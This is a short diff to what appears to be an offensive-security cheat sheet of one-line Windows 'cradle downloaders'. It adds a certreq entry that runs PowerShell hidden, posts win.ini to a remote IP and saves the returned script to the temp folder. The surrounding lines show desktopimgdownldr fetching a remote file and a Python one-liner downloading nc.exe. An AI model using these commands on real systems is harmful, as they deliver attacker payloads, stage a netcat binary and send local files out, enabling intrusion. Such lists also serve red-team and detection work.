@@ -2133,6 +2133,11 @@ This section contains onelinner crandle downloaders that for one reason or anoth
       set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
 
 <br /><br />
+**certreq Downloaders**<br />
+
+      powershell -w 1 CertReq.exe -Post -config http://192.168.1.73/hello.ps1 c:\windows\win.ini %tmp%\Hello.ps1
+
+<br /><br />
 **Python Downloaders**<br />
 
       python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
